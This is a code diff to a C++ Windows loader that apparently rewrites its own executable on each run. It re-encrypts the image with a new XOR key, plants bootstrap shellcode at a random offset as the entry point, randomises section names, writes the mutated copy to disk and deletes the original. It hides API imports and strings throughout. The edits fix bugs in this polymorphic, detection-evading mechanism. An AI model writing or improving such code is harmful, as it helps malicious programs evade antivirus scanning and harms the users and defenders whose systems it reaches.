@@ -66,10 +66,11 @@ extern "C" int initial_loader(ULONG_PTR xorKey) {
 
     // copy headers
     inline_memcpy((PVOID)new_image_base, (PVOID)base, nt_headers->OptionalHeader.SizeOfHeaders);
+    nt_headers = (PIMAGE_NT_HEADERS)(new_image_base + ((PIMAGE_DOS_HEADER)new_image_base)->e_lfanew);
+    section_header = IMAGE_FIRST_SECTION(nt_headers);
 
     // update image base in new executable to the current base the executable is loaded at
-    PIMAGE_NT_HEADERS new_nt_headers = (PIMAGE_NT_HEADERS)(new_image_base + ((PIMAGE_DOS_HEADER)new_image_base)->e_lfanew);
-    new_nt_headers->OptionalHeader.ImageBase = base;
+    nt_headers->OptionalHeader.ImageBase = base;
 
     // unmap sections
     for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
@@ -89,6 +90,7 @@ extern "C" int initial_loader(ULONG_PTR xorKey) {
     section_header = IMAGE_FIRST_SECTION(nt_headers);
     PIMAGE_SECTION_HEADER loader_section = nullptr;
     PIMAGE_SECTION_HEADER bootstrap_section = nullptr;
+    DWORD FileSize = 0;
     for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
         auto section = &section_header[i];
         switch (section->Name[0]) {
@@ -106,6 +108,9 @@ extern "C" int initial_loader(ULONG_PTR xorKey) {
             }
             break;
         }
+
+        // calculate file size
+        FileSize = max(FileSize, section->PointerToRawData + section->SizeOfRawData);
     }
 
     if (!loader_section) {
@@ -128,13 +133,14 @@ extern "C" int initial_loader(ULONG_PTR xorKey) {
     auto bootstrap_shellcode = get_bootstrap_shellcode(new_xor_key, loader_section->VirtualAddress, loader_section->SizeOfRawData);
 
     // pick a random offset in the bootstrap section to store the bootstrap shellcode
-    ULONG_PTR bootstrap_shellcode_offset = fnRtlRandomEx(&seed) % (bootstrap_section->SizeOfRawData - bootstrap_shellcode.size());
+    ULONG_PTR max_offset = bootstrap_section->SizeOfRawData - bootstrap_shellcode.size();
+    ULONG_PTR bootstrap_shellcode_offset = max_offset == 0 ? 0 : (fnRtlRandomEx(&seed) % max_offset);
 
     // copy bootstrap shellcode to new executable
     inline_memcpy((PVOID)(new_image_base + bootstrap_section->PointerToRawData + bootstrap_shellcode_offset), bootstrap_shellcode.data(), bootstrap_shellcode.size());
 
     // update entry point to point to bootstrap shellcode
-    new_nt_headers->OptionalHeader.AddressOfEntryPoint = bootstrap_section->VirtualAddress + bootstrap_shellcode_offset;
+    nt_headers->OptionalHeader.AddressOfEntryPoint = bootstrap_section->VirtualAddress + bootstrap_shellcode_offset;
 
     // randomize section names
     for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
@@ -158,7 +164,7 @@ extern "C" int initial_loader(ULONG_PTR xorKey) {
 
     // write new executable to disk
     DWORD bytes_written = 0;
-    if (!LI_FN(WriteFile)(file_handle, (PVOID)new_image_base, nt_headers->OptionalHeader.SizeOfImage, &bytes_written, nullptr)) {
+    if (!LI_FN(WriteFile)(file_handle, (PVOID)new_image_base, FileSize, &bytes_written, nullptr)) {
         ERROR_MESSAGE("Failed to write new executable to disk");
         return 5;
     }
@@ -166,10 +172,17 @@ extern "C" int initial_loader(ULONG_PTR xorKey) {
     // close file handle
     LI_FN(CloseHandle)(file_handle);
 
+    if (bytes_written != FileSize) {
+        ERROR_MESSAGE("Failed to write entire new executable to disk");
+        return 6;
+    }
+
     // delete original executable
     LI_FN(DeleteFileA)(LI_FN(GetCommandLineA)());
 
     // display message box
-    LI_FN(MessageBoxA)(nullptr, xorstr_("WORKS!"), xorstr_("WORKS"), MB_OK | MB_ICONERROR);
+    // LI_FN(MessageBoxA)(nullptr, xorstr_("WORKS!"), xorstr_("WORKS"), MB_OK | MB_ICONERROR);
+
+    LI_FN(ExitProcess)(0);
     return 0;
 }
